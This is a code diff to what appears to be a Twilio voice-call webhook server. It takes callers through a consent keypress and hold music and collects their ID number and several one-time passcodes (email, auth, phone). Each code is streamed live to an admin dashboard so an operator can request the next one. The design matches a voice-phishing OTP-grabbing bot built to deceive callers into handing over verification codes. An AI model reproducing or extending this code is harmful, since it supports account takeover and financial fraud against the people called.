@@ -106,18 +106,13 @@ router.post('/voice-response/:sessionId', async (req, res) => {
             twiml.hangup();
             
         } else if (currentAction === 'playing_music') {
-            // Play music and wait for admin action
             twiml.say('Please hold while we validate your details.');
-            const play = twiml.play({
-                loop: 10
-            });
+            const play = twiml.play({ loop: 10 });
             play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
-            // Stay in music until admin interrupts
             twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
             
         } else {
-            // Default - wait for admin
-            twiml.say('Please wait for an agent.');
+            twiml.say('Please wait for admin instructions.');
             twiml.hangup();
         }
         
@@ -143,7 +138,6 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
     console.log('Consent - Session:', sessionId, 'Digits:', Digits);
     
     if (Digits === '1') {
-        // Update session to waiting for admin action
         await db.query(
             `UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`,
             [sessionId]
@@ -154,14 +148,10 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
             [sessionId, 'consent', '1']
         );
         
-        // EMIT TO ADMIN DASHBOARD INSTANTLY
-        io.emit('user_consent', { 
-            session_id: sessionId, 
-            status: 'consent_given',
-            message: 'User pressed 1 - Ready for requests'
-        });
+        // SEND TO DASHBOARD - THIS IS WHAT YOU NEED
+        io.emit('user_response', { session_id: sessionId, type: 'consent', value: '1' });
         
-        twiml.say('Thank you. Please hold while we connect you.');
+        twiml.say('Thank you. Please hold while we validate your details.');
         const play = twiml.play({ loop: 10 });
         play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
@@ -176,7 +166,6 @@ router.post('/handle-consent/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// Check hold status - keeps music playing until admin interrupts
 router.post('/check-hold/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const twiml = new VoiceResponse();
@@ -187,12 +176,10 @@ router.post('/check-hold/:sessionId', async (req, res) => {
     );
     
     if (session.rows[0] && session.rows[0].current_action === 'playing_music') {
-        // Still on hold, continue music
         const play = twiml.play({ loop: 5 });
         play.url = 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3';
         twiml.redirect(`/webhooks/check-hold/${sessionId}`, { method: 'POST' });
     } else {
-        // Admin interrupted - go to next action
         twiml.redirect(`/webhooks/voice-response/${sessionId}`, { method: 'POST' });
     }
     
@@ -200,7 +187,6 @@ router.post('/check-hold/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT ID
 router.post('/collect-id/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
@@ -216,7 +202,6 @@ router.post('/collect-id/:sessionId', async (req, res) => {
         
         io.emit('data_collected', { session_id: sessionId, type: 'id_number', value: Digits });
         
-        // Go back to music/hold
         await db.query(`UPDATE call_sessions SET current_action = 'playing_music' WHERE id = $1`, [sessionId]);
         
         twiml.say('Thank you. Please hold while we validate your details.');
@@ -232,7 +217,6 @@ router.post('/collect-id/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT EMAIL OTP
 router.post('/collect-email-otp/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
@@ -263,7 +247,6 @@ router.post('/collect-email-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT AUTH OTP
 router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
@@ -294,7 +277,6 @@ router.post('/collect-auth-otp/:sessionId', async (req, res) => {
     res.send(twiml.toString());
 });
 
-// COLLECT PHONE OTP
 router.post('/collect-phone-otp/:sessionId', async (req, res) => {
     const sessionId = req.params.sessionId;
     const { Digits } = req.body;
